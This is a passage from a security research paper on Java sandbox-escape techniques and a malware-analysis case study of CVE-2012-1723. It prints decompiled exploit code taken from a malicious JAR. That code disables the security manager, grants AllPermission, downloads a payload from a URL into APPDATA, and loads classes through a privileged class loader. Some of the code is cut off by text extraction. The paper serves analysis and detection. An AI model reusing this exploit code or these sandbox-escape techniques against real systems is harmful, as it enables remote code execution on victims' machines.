use of least privilege violations, unsafe reflection, and type confusion. 
Controlled out-of-bounds writes and buffer overflows can be used to overwrite function pointers or saved return 
pointers. However, these techniques will also require DEP and ASLR to be bypassed. A much simpler method is to 
make use of the java.beans.Statement class. A Statement object essentially represents a single line of Java code of 
the following form: 
All Statement objects have an AccessControlContext instance variable that is used when invoking the statement. 
The intended purpose is to prevent least privilege violations and since the instance variable is final, within the 
confines of the JVM, it is successful. However, if we allocate a Statement object such that we can use a buffer 
overflow or out-of-bounds write to overwrite the saved AccessControlContext, then invocation of the statement will 
occur at a higher privilege than intended. In practice, this requires allocating a Statement object and replacing the 
saved AccessControlContext with one that implements AllPermission. This allows you to turn an out-of-bounds 
CWE-843	
Type Confusion	
CWE-470	
Unsafe Reﬂection	
CWE-272	
Least Privilege Violation	
CWE-114	
Process Control	
CWE-122	
Heap-based Buﬀer Overﬂow	
instanceVariable.instanceMethod(argument1) 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
write or buffer overflow into a least privilege violation which means that DEP and ASLR are not an issue. Usage of 
this technique does require the ability to predict where the Statement object will be relative to the buffer you are 
overflowing or writing past. 
The second technique occurs in pure Java and essentially comes down to the following statement being executed: 
The aforementioned statement is part of how Java has received its “write once, own everywhere” reputation. Once 
executed in a higher context with no user stack, all subsequent statements will be executed with no sandbox to 
stop it. 
Case Study: CVE-2012-1723 
CVE-2012-1723 is a vulnerability with the bytecode verifier within HotSpot that can lead to type confusion. It was 
very popular with malware authors and has characteristics that make it easy to identify. Three easy things to look 
for that are indicative of CVE-2012-1723 are: 
• 
The presence of a class that has at least 100 instance variables of a single class and a single static variable 
of another class 
o 
Exploitation of this vulnerability does not require these variables to ever be set and as such, you 
are unlikely to see a sample that sets them to any value 
• 
The presence of a method within that class that takes the static class’ type as an argument and returns the 
instance variables’ type as a return value 
• 
The presence of repeated calls to the aforementioned method with null as the sole argument 
While it is possible that the malware author was clever enough to obfuscate the code such that common 
decompilers fail to properly decompile it, we see that it was weakly obfuscated using Allitori’s Java Obfuscator16. 
Note that this is not representative of the capabilities of Allitori’s obfuscator but of the options within the obfuscator 
that the malware author enabled. The JAR file contained six class files: Adw.class, dqqOzf.class, dumppzGr.class, 
qFvtPH.class, qWodxNpkOs.class, and vceBGl.class. The dumppzGr, qFvtPH, and vceBGl were not used by the exploit 
code, so they are not included in the dump below: 
16 http://www.allatori.com/ 
System.setSecurityManager(null) 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
//Adw 
import java.io.PrintStream; 
import java.net.URL; 
import java.security.AllPermission; 
import java.security.CodeSource; 
import java.security.Permissions; 
import java.security.cert.Certificate; 
public class Adw 
{ 
  public static String mwYda(String paramString) 
  { 
    String[] arrayOfString = paramString.split("hj"); 
    String str = ""; 
    System.out.println(arrayOfString.length); 
    return qWodxNpkOs.qNkV(arrayOfString, 0); 
  } 
  public static URL RWdvAlV(String paramString, int paramInt) 
    throws Exception 
  { 
    String str = paramString; 
    str = str + (char)(Math.min(113, 2454) + paramInt); 
    str = str + (char)(Math.min(116, 23544) + paramInt); 
    str = str + (char)(Math.min(109, 23544) + paramInt); 
    str = str + (char)(Math.min(66, 7275) + paramInt); 
    str = str + (char)(Math.min(55, 3235) + paramInt); 
    str = str + (char)(Math.min(55, 2225) + paramInt); 
    str = str + (char)(Math.min(55, 6275) + paramInt); 
    return new URL(str); 
  } 
  public static CodeSource FsXSABhE(Certificate[] paramArrayOfCertificate,  
                                    Permissions paramPermissions) 
    throws Exception 
  { 
    paramPermissions.add(new AllPermission()); 
    return new CodeSource(RWdvAlV("f", -8), paramArrayOfCertificate); 
  } 
} 
//dqqOzf 
import java.io.BufferedInputStream; 
import java.io.BufferedOutputStream; 
import java.io.FileOutputStream; 
import java.io.PrintStream; 
import java.lang.reflect.Constructor; 
import java.net.URL; 
import java.security.AccessController; 
import java.security.PrivilegedExceptionAction; 
public class dqqOzf 
  implements PrivilegedExceptionAction 
{ 
  static String FGxIhk; 
  int vbEfOUE = 51361; 
  int JQNmeVgsUu = 205959; 
  static String IXKQHUlU = "svr3"; 
  static final int TiwCFY = 1024; 
  public dqqOzf(String paramString1, String paramString2) 
  { 
    try 
    { 
      AccessController.doPrivileged(this); 
      ndOGfc(paramString1, paramString2); 
    } 
    catch (Exception localException) 
    { 
    } 
  } 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
  public static void DASIS(String paramString1, String paramString2,  
                           Class paramClass) 
    throws Exception 
  { 
    Object[] a = new Object[] { Adw.mwYda(paramString1),  
                            Adw.mwYda(paramString2) }; 
    paramClass.getConstructor(qWodxNpkOs.JebR()).newInstance(a); 
  } 
  void hfRDH(SecurityManager paramSecurityManager) 
  { 
    System.setSecurityManager(paramSecurityManager); 
  } 
  public Object run() 
  { 
    hfRDH(null); 
    return Integer.valueOf(56); 
  } 
  public static String xUdVD(int paramInt1, int paramInt2) 
  { 
    String str = ""; 
    str = str + (char)(int)(Math.round(-106.5D) * -1L); 
    str = str + (char)Math.abs(paramInt2); 
    str = str + (char)(int)(Math.round(-117.59999999999999D) * -1L); 
    str = str + (char)Math.abs(paramInt2); 
    str = str + (char)Math.abs(paramInt1); 
    str = str + (char)Math.abs(-105); 
    str = str + (char)Math.abs(-111); 
    str = str + (char)Math.abs(paramInt1); 
    str = str + (char)Math.abs(-116); 
    str = str + (char)(int)(Math.round(-108.59999999999999D) * -1L); 
    str = str + (char)Math.abs(-112); 
    str = str + (char)Math.abs(-100); 
    str = str + (char)Math.abs(-105); 
    str = str + (char)Math.abs(-114); 
    return str; 
  } 
  public static FileOutputStream tqxwAzdag(String paramString, int paramInt1,  
                                           int paramInt2) 
    throws Exception 
  { 
    String str = xUdVD(paramInt1, paramInt2); 
    System.out.println(str.replace("a", "uuu")); 
    FGxIhk = System.getenv("APPDATA").concat(paramString); 
    FileOutputStream localFileOutputStream = new FileOutputStream(FGxIhk); 
    return localFileOutputStream; 
  } 
  static int ARrlm(String[] paramArrayOfString, int paramInt1, int paramInt2) 
  { 
    return Integer.parseInt(paramArrayOfString[paramInt1]) + paramInt2; 
  } 
  static String AWGnFoHhfj(String[] paramArrayOfString, int paramInt1, int paramInt2) 
  { 
    String str = ""; 
    while (paramInt1 = 0) 
      paramBufferedOutputStream.write(arrayOfByte, 0, i); 
  } 
  public static void xBoGAroU(String paramString1, String paramString2) 
  { 
    try 
    { 
      BufferedInputStream localBufferedInputStream =  
    new BufferedInputStream(new URL(paramString1).openStream()); 
      FileOutputStream localFileOutputStream =  
    tqxwAzdag("\\".concat(paramString2), -46, -97); 
      BufferedOutputStream localBufferedOutputStream =  
    new BufferedOutputStream(localFileOutputStream, 1024); 
      fVgym(localBufferedOutputStream, localBufferedInputStream); 
      NBCwYF(localBufferedOutputStream, localBufferedInputStream); 
    } 
    catch (Exception localException) 
    { 
    } 
  } 
  public void ndOGfc(String paramString1, String paramString2) 
  { 
    try 
    { 
      BufferedInputStream localBufferedInputStream =  
    new BufferedInputStream(new URL(paramString1).openStream()); 
      FileOutputStream localFileOutputStream =  
    tqxwAzdag("\\".concat(paramString2), -46, -97); 
      BufferedOutputStream localBufferedOutputStream =  
   new BufferedOutputStream(localFileOutputStream, 1024); 
      int i = Math.min(387956, 255862) ^ 0x3A83E; 
      fVgym(localBufferedOutputStream, localBufferedInputStream); 
      NBCwYF(localBufferedOutputStream, localBufferedInputStream); 
    } 
    catch (Exception localException) { } 
  } 
} 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
//qWodxNpkOs 
import com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory; 
import com.sun.org.glassfish.gmbal.util.GenericConstructor; 
import java.applet.Applet; 
import java.io.ByteArrayOutputStream; 
import java.io.InputStream; 
import java.io.PrintStream; 
import java.lang.reflect.Method; 
public class qWodxNpkOs extends Applet 
{ 
  static String qNkV(String[] paramArrayOfString, int paramInt) 
  { 
    String str = ""; 
    while (paramInt  0) 
        localByteArrayOutputStream.write(arrayOfByte, 0, i); 
      arrayOfByte = localByteArrayOutputStream.toByteArray(); 
      String a = "sun.inv".concat("oke.anon.Anonymo").concat("usClassLoader"); 
      GenericConstructor localGenericConstructor =  
    new GenericConstructor(Object.class, a, new Class[0]); 
      Object localObject = localGenericConstructor.create(new Object[0]); 
      String b = "loa".concat("dClass"); 
      Class[] c = new Class[] { Byte[].class }; 
      Method localMethod =  
    ManagedObjectManagerFactory.getMethod(localObject.getClass(), b, c); 
      Class localClass = (Class)localMethod.invoke(localObject,  
                                               new Object[] { arrayOfByte }); 
      dqqOzf.DASIS(paramString1, paramString2, localClass); 
    } 
    catch (Exception localException) 
    { 
    } 
  } 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
While no main class was specified in the JAR’s manifest, we can assume that qWodxNpkOs is the main class as it is a 
subclass of Applet. The presence of an init method that ensures that it is running on Java 1.7 before continuing 
confirms this theory. That leaves Adw and dqqOzf as questionably relevant. Of Adw’s three static methods, only 
mwYda is called from another function and since all it does is split the input string by “hj” before passing to another 
function, we can easily replace calls to it so that we can eliminate this class. The dqqOzf class is a subclass of 
PrivilegedExceptionAction and contains a doPrivileged block within its constructor. Since a new instance of dqqOzf is 
created within qWodxNpk, we surmise that this is another useful class. At this point we have gone from six 
potentially relevant classes to just two. We now apply constant propagation and dead code elimination to further de-
obfuscate these two classes. We will also evaluate pure functions whenever possible and inline functions wherever it 
makes sense and makes the code more readable. Constant propagation is the act of replacing variables with known 
values. As an example, we saw the following function in this piece of malware: 
We also saw a single call to this function that looked like the following: 
  int LXIt(int paramInt1, int paramInt2, int paramInt3, int paramInt4,  
           String paramString, long paramLong) 
  { 
    return paramInt3 ^ 318100 - paramInt1 * 143360; 